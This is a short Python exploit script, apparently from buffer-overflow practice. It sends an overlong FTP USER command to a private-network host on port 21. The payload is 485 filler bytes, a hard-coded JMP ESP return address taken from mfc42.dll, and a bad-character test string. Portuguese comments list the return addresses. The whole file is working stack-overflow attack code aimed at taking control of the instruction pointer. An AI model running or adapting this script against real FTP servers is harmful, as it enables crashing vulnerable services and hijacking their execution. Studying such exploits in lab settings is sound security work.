#!/usr/bin/python
import socket

#badchars \x00\x0a\x0d\x20\x27\x40
bad=(b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x21\x22\x23\x24\x25\x26\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f")

# Endereco para JMP ESP em user32.dll - 7E379353
# Endereço para JMP ESP em mfc42.dll - 7C86467B
buf = (b'A' * 485 + b'\x7b\x46\x86\x7c' + bad)

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.50.102", 21))
s.send(b"USER " + buf + b" \r\n")
